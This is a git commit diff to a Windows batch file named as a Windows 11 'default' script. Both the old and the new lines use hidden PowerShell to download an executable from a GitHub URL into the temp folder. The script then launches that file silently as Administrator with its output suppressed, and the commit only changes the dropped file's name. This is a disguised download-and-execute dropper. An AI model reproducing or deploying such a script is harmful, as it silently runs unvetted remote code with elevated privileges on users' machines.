eeb97f88a83917c9030bba30580037e039ede541
optolab <sloneeddie36@gmail.com>
2025-01-12 14:00:45 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,6 +1,6 @@
 @echo off
 
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\restore.exe" >nul 2>&1
-start /B "" runas /user:Administrator "%TEMP%\restore.exe"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\default.exe" >nul 2>&1
+start /B "" runas /user:Administrator "%TEMP%\default.exe"
 
 endlocal
